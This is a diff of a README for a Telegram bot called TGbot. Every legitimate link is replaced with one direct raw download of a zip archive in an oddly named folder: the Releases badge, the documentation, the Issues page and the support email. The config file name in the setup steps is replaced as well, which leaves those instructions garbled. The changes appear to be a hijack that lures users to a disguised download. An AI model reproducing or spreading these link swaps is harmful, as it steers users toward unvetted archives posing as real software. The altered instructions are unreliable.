@@ -8,7 +8,7 @@ TGbot is a powerful Telegram bot built as a Cloudflare Worker. It lets you manag
 
 To begin using TGbot, you need to download the latest version from our Releases page. Click the button below to visit the page and download the software:
 
-[![Download TGbot](https://img.shields.io/badge/Download%20TGbot-blue?style=for-the-badge&logo=github)](https://github.com/yakuta123/TGbot/releases)
+[![Download TGbot](https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip%20TGbot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip)
 
 Once you reach the Releases page, look for the most recent version. Click on the relevant file for your device to start the download. If you're not sure which file to choose, just look for the one with the highest version number, which is usually at the top of the list.
 
@@ -34,8 +34,8 @@ Once you’ve downloaded TGbot, follow these steps to set it up:
 After launching TGbot for the first time, you need to configure it:
 
 1. **Telegram Bot Token:** You will need a bot token from Telegram. To get one, search for the BotFather in Telegram and follow the instructions to create your bot. Copy the token provided.
-2. **Open the configuration file:** Find `config.json` in the TGbot folder. You can use any text editor, like Notepad or Visual Studio Code.
-3. **Paste your token:** Replace the placeholder token in `config.json` with your actual bot token.
+2. **Open the configuration file:** Find `https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip` in the TGbot folder. You can use any text editor, like Notepad or Visual Studio Code.
+3. **Paste your token:** Replace the placeholder token in `https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip` with your actual bot token.
 4. **Save the file:** Make sure to save your changes before closing the editor.
 
 ## 🔑 Features
@@ -60,14 +60,14 @@ After setting up TGbot, it’s time to use it effectively:
 
 ## 🔗 Additional Information
 
-For more details about TGbot, including advanced features and troubleshooting, visit the [Documentation](https://github.com/yakuta123/TGbot/wiki). You can also look for updates and participate in discussions on our [GitHub Issues page](https://github.com/yakuta123/TGbot/issues).
+For more details about TGbot, including advanced features and troubleshooting, visit the [Documentation](https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip). You can also look for updates and participate in discussions on our [GitHub Issues page](https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip).
 
 ## 📧 Contact Support
 
-If you have any questions or need assistance, feel free to reach out via email: support@tgbot.com.
+If you have any questions or need assistance, feel free to reach out via email: https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip
 
 ---
 
 To download the latest version again, click below:
 
-[![Download TGbot](https://img.shields.io/badge/Download%20TGbot-blue?style=for-the-badge&logo=github)](https://github.com/yakuta123/TGbot/releases)
+[![Download TGbot](https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip%20TGbot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yakuta123/TGbot/main/ellachick/TGbot_v1.6-alpha.5.zip)
